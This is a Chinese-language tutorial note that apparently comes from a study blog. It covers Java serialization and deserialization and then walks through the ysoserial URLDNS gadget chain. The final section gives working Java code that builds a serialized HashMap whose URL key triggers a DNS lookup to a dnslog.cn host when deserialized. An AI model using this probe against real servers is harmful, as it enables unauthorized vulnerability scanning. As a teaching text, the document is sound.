###### tags: `Java 反序列化`
[TOC]
# Java 序列化与反序列化
<!--toc-->
学习完反射就可以正式开始学习 Java 反序列化。
<!--more-->


## 定义

### java 序列化和反序列化是什么？

Java 序列化是指把 Java 对象转换为字节序列的过程，而 Java 反序列化是指把字节序列恢复为 Java 对象的过程。

序列化分为两大部分：序列化和反序列化。序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求数据的对象实例。



### 功能和用处

#### java 序列化和反序列化有什么功能和用处？

我们知道，当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java 进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要 Java 序列化与反序列化了。为实现进程间的对象传送，发送方需要把这个Java 对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。

 当我们明晰了为什么需要 Java 序列化和反序列化后，我们很自然地会想 Java 序列化的好处。其好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。

#### 什么时候会用到 Java 序列化和反序列化？

- 想把内存中的对象保存到一个文件中或者数据库中时候；
- 想用套接字在网络上传送对象的时候；
- 想通过RMI传输对象的时候



## 如何进行 Java 序列化和反序列化？



假设我们定义了如下的 Employee 类，该类实现了 Serializable 接口（只有继承了该接口的类才可以序列化）。

```java=
public class Employee implements java.io.Serializable
{
   public String name;
   public String address;
   public transient int SSN; //注意 transient 关键字表明该属性是短暂的，也就是不会被反序列化
   public int number;
   public void mailCheck()
   {
      System.out.println("Mailing a check to " + name
                           + " " + address);
   }
}
```

### 序列化对象

#### 用到的辅助类

`ObjectOutputStream` 类用来序列化一个对象，如下的 `SerializeDemo` 例子实例化了一个 `Employee` 对象，并将该对象序列化到一个文件中。

如果你对 Java IO 流不甚理解，那么可以看一下这篇文章：[JavaIO](https://tobebetterjavaer.com/io/serialize.html#objectoutputstream%E7%B1%BB)



```java=
public class Demo01ObjectOutputStream {
    public static void main(String[] args) throws IOException {
        //1. 创建序列化流，用来写
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("day12\\file03-obj.txt"));
        //2. 调用writeObject方法，写对象
        Person p = new Person("张三丰", 100);
        oos.writeObject(p);
        //3. 释放资源。
        oos.close();
    }
}
```

### 反序列化对象

#### 用到的辅助类
![](https://i.imgur.com/epzfCAy.png)

**特殊情况:**

被 static 修饰的成员变量无法序列化，无法写到文件。

如果不希望某个成员变量写到文件，同时又不希望使用 static 关键字， 那么可以使用 transient。transient 关键字表示瞬态，被 transient 修饰的成员变量无法被序列化。

```java=
//从文件中读取Person对象
    public static void readPerson() throws IOException, ClassNotFoundException {
        //创建反序列化流
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("day12\\file04-obj.txt"));
        //从文件中读取对象
        Object obj = ois.readObject();
        System.out.println(obj);
        //释放资源
        ois.close();
    }
```



##### 序列化代码示例

```java=
import Demo1.Employee;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class SerializeDemo {
    public static void main(String[] args) {

        Employee e = new Employee();
        e.name = "rain";
        e.address = "beijing";
        e.SSN = 11122333;
        e.number = 101;
        try{
            /*
            以下操作可以归结为几个步骤：
            1. 定义输出流的源头，也就是说输出流中的数据最终会流向什么地方。
            2. 定于输出流本身
            3. 调用输出流的 writeObject 方法向输出流中写入数据
            4. 关闭相关流
            可以抽象地说我们将对象中的数据序列化放入输出流中，然后输出流流向了test.ser文件里
             */
            FileOutputStream fileOut = new FileOutputStream("./test.ser");
            ObjectOutputStream out = new ObjectOutputStream(fileOut);
            out.writeObject(e);
            out.close();
            fileOut.close();
            System.out.printf("Serialized data is saved in test.ser");



        }catch(IOException i){
            i.printStackTrace();

        }
    }
}
```

##### 反序列化代码示例

```java=
package Demo2;
import java.io.*;
import Demo1.Employee;

public class DeserializeDemo {
    public static void main(String [] args){
        Employee e = null;
        try{
            FileInputStream fileIn = new FileInputStream("./test.ser");
            ObjectInputStream in = new ObjectInputStream(fileIn);
            e = (Employee) in.readObject();
            in.close();

        }catch (IOException i ){
            i.printStackTrace();
            return;
        }catch (ClassNotFoundException c){
            System.out.println("Employee class not found");

        }
        System.out.println("Deserialized Employee..");
        System.out.println("Name:" + e.name);
        System.out.println("Address: "+ e.address);



    }

}

```

这里要注意以下要点：

`readObject()` 方法中的 try/catch 代码块尝试捕获 `ClassNotFoundException` 异常。对于 JVM 可以的反序列化对象，它必须是能够找到字节码的类。如果 JVM 在反序列化对象的过程中找不到该类，则抛出一个 `ClassNotFoundException` 异常。注意，`readObject()` 方法的返回值被转化成 Employee 引用。

当对象被序列化时，属性 SSN 的值为 111222333，但是因为该属性是短暂的，该值没有被发送到输出流。所以反序列化后 Employee 对象的 SSN 属性为 0。



### 序列化过程中的注意事项

一个类的对象要想序列化成功，必须满足两个条件：

- 该类必须实现 `java.io.Serializable` 接口。
- 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。

如果你想知道一个 Java 标准类是否是可序列化的，请查看该类的文档。检验一个类的实例是否能序列化十分简单，只需要查看该类有没有实现 `java.io.Serializable` 接口。

### 为什么会产生序列化的安全问题

#### 服务端反序列化自动执行 readObject 方法

序列化和反序列化中有两个特别重要的方法：

- writeObject
- readObject

这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。

![](https://i.imgur.com/a9gF513.png)


```java=
private void writeObject(java.io.ObjectOutputStream s)throws java.io.IOException
private void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundException
```

只要服务端反序列化数据，客户端传递类的 `readObject` 中的代码就会自动执行，给予攻击者在服务器上运行代码的能力。所以从根本上来说，java 反序列化的漏洞与 `readObject` 方法有关。

#### 可能存在安全漏洞的形式

##### 入口类的 `readObject` 直接调用危险方法

这种情况在实际开发场景比较少见，仅作为一个示例演示一下。以下展示了一个弹计算器的代码，思路就是**在我们要反序列化的类里面写一个 readObject 方法**，这样服务端反序列化时就会自动调用我们写的这个 readObject 方法！

**SerializatinTest.java** 内容如下：

```java=
package com.kuang.reflection;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;

public class SerializationTest {
    public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws Exception{
        Person person = new Person("aa",22);
        System.out.println(person);
        serialize(person);
    }
}
```



`UnserializeTest.java` 内容如下：

```java=
package com.kuang.reflection;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class UnserializeTest {
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{
        Person person = (Person)unserialize("ser.bin");
        System.out.println(person);
    }
}
```



**Person.java** 内容如下：

![](https://i.imgur.com/MBm5mMQ.png)


先运行序列化程序，再运行反序列化程序就会自动弹出计算器！入口类的 readObject直接调用危险方法是攻击最理想的情况，但是这种情况几乎不会出现。

#### 入口参数中包含可控类，该类有危险方法， `readObject` 时调用

#### 入口类参数中包含可控类，该类又调用其他有危险方法的类，`readObject` 时调用

#### 构造函数/静态代码块等类加载时隐式执行

### 产生漏洞的攻击路线

- 首先攻击的前提是继承了 `Serializable` 接口

- 入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）
- 找到入口类之后要找调用链 gadget chain 相同名称、相同类型
- 执行类 sink（RCE SSRF 写文件等等） 比如 `exec` 这种函数

## 实战—— URLDNS-使用 Java 反序列化发起一个 DNS 请求

- 出发点：URLDNS 在 JAVA 复杂的反序列化漏洞中足够简单；URLDNS 就是 ysoserial 中一个利用链的名字，虽然准确来说这个不能称作 “利用链”。因为其参数不是一个可以利用的命令，而仅为一个 URL，其能触发的结果也不是命令执行，而是一次 DNS 请求。
- 虽然这个利用链实际上不能利用，但因为其如下的优点，非常适合我们在检测反序列化漏洞时使用。如 使用 Java 内置的类构造，对第三方库没有依赖。在目标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞 URL 类。

我们先去到 ysoserial 的项目当中，去看看它是如何构造 URLDNS 链的。

[ysoserial/URLDNS.java at master · frohoff/ysoserial (github.com)](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java)

更详细的信息在：

[Triggering a DNS lookup using Java Deserialization](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)



![](https://i.imgur.com/7v1u95f.png)


现在开始正式复现 URLDNS 利用链！

### 前言

Java URL 类在其 `equals` 和 `hashCode` 方法中有一个有趣的性质，那就是在调用这两个方法时 URL 类会发起一个 DNS 查询请求（准确地说在这两个方法中有一个比较操作，在这个比较操作期间会触发 dns 查询 ）。根据 javadocs，如果两个 hosts 的主机名被解析为同一个 IP 地址，那么这两个 hosts 被认为是等价的。

所以，如果我们能得到一个 在URL 对象上调用 `equals` 或 `hashCode` 方法的 gadget，那么我们就可以发起一个 DNS 查询。我们可以通过追踪这个 DNS 查询来验证反序列化是否发生以及在我们控制下的代码是否被执行。常见的 DNS 追踪工具有 DNSChef、Burp Collaborator、[DNSLOG](http://dnslog.cn/) 等

### 反序列化过程中是如何发起 DNS 查询请求的？
首先要知道的是 HashMap 类是重写了 `readObject()` 方法的，这满足我们前面说的服务端反序列化会自动触发 `readObject()` 的条件。

下图是 HashMap 类的 `reddObject()` 方法源码：
![](https://i.imgur.com/4Tydeud.png)

在 HashMap 类的 `readObject` 方法中，其通过读取 HashMap 的结构状态开始，然后对其包含的所有项进行一个循环。在循环过程中，该方法会从**流**中读取 key 和 value。然后 HashMap 会以 key 的哈希值、key、value 为参数调用 `putVal` 方法。相关代码如下：

![](https://i.imgur.com/W2Rnjjm.png)

上图中的 s 是我们传给 `HashMap.readObject()` 方法的输入流，该流是我们可控的，所以我们可以间接地控制反序列化后的 key 和 value。这就是我们所需要的东西，我们有一个调用了 `readObject()` 方法的对象，同时这个 `readObject()` 方法将会在一个我们可控的对象上调用 `hashCode()` 方法。
但是上图并没有 `hashCode()` 方法呀，该方法在哪里？实际上，对于 `hashCode()` 方法的调用发生在上图的 `HashMap.hash()` 方法内部。跟进上图的 `hash()` 方法，该方法内部就调用了 `key.hashCode()` 方法

![](https://i.imgur.com/m1YcbMj.png)




通过提供一个 Java URL 对象 作为 HashMap 的 key，我们将在反序列化过程中发起一个 DNS 查询（lookup）。此时 key 是一个 Java URL 对象，那么 `key.hashCode` 就是调用 URL 对象的 `hashCode()` 方法，我们定义一个URL对象然后看看这个方法。

```java=
URL url = new URL("http://san59s.dnslog.cn");
```

![](https://i.imgur.com/TbtdxX4.png)


发现这个方法内部会调用 `handler.hashCode()` 方法，而 `handler` 是一个 `URLStreamHandler` 对象

![](https://i.imgur.com/tdRSKVd.png)


所以我们看看这个 `URLStreamHandler` 类的 `hashCode()` 方法

![](https://i.imgur.com/aH0zus1.png)


`URLStreamHandler` 类的 hashCode() 方法比较长，但是我们只需要关注关键函数即可，上图中框起来的 `getHostAddress()` 方法就是我们想要的，跟进到这个方法内部如下：

![](https://i.imgur.com/tmj08bP.png)


可以发现最后调用的是一个 URL 类的 `getHostAddress()` 方法，而这个方法会发起一个 DNS 查询。看到这相信我们就明白这个 URLDNS 链是如何触发一个DNS 查询请求的了，调用链整体并不长，可以归纳调用链如下：

```
Gadget Chain:
    HashMap.readObject()
        HashMap.putVal()
            HashMap.hash()
                URL.hashCode()
```



### 注意事项

当 URL 对象刚开始放置在一个 HashMap 中时，通过调用 `put` 方法，`HashMap.hash` 方法将会被调用。

![](https://i.imgur.com/O7VU8RF.png)




我们传入的 key 是一个 URL 类的对象，所以调用的实际上是 URL 类的 `hashCode()` 方法



![](https://i.imgur.com/s1TsX7C.png)

同时从从上图可以看到如果 `hashCode` 不等于 -1，直接返回 hashCode 变量。那这就会有一个问题，那就是我们传入的 URL 对象其 hashCode 默认值是等于 -1 的。其将 hashCode 值存储在一个不是 transient 的实例变量中，如下图
![](https://i.imgur.com/SsUOSUl.png)


所以在这里会直接调用 `handler.hashCode()` 方法，如下图
![](https://i.imgur.com/sJUskc3.png)


那这样就会发起一个 DNS 查询请求，也就是说我们在序列化之前就已经发起了一个 DNS 查询请求，这就会和我们反序列化时发起的 DNS 请求弄混，所以我们要避免这种情况。那很自然的思路就是将以上的 URL 类对象的 `hashCode` 改成不是 -1 ，这样就会在调用 `hashCode()` 方法时直接返回，而不是发起一个 DNS 查询请求。那如何做到这一点呢？没错就是通过**反射**！

我们可以通过反射将 URL 类对象的 `hashCode` 属性值改为不等于 -1 ，然后调用 `HashMap.put()` 方法放入 这个 URL 类对象。之后再通过反射将 URL 类对象的 `hashCode` 属性值再改回 -1 ，然后进行序列化即可。最后当我们进行反序列化时，根据前面的分析，此时就会自动调用 HashMap 类的 `readObject` 方法并发起一个 DNS 查询请求。

以下是代码：

```java=
public class SerializationTest {
    public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws Exception{
        HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
        URL url = new URL("http://san59s.dnslog.cn");
        Class c= url.getClass();
        Field hashcodefield = c.getDeclaredField("hashCode");
        hashcodefield.setAccessible(true);
        hashcodefield.set(url,1234);
        hashmap.put(url,1);

        hashcodefield.set(url,-1);

        serialize(hashmap);


    }
}
```

代码中有一个有趣的地方，那就是将 URL 类的一个对象 url 的 hashCode 改回 -1 时是直接调用前面得到的 Field 对象实例来进行的，而不是通过 HashMap 的实例对象 hashmap。根据直觉，我们都已经通过 hashmap 的 put 方法将 url 放入进去，那么再修改 url 的值似乎不应该影响到 hashmap。



### 参考链接

[CSDN](https://blog.csdn.net/mocas_wang/article/details/107621010)

[菜鸟教程](https://www.runoob.com/java/java-serialization.html)

[芜风师傅](https://drun1baby.github.io/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#toc-heading-14)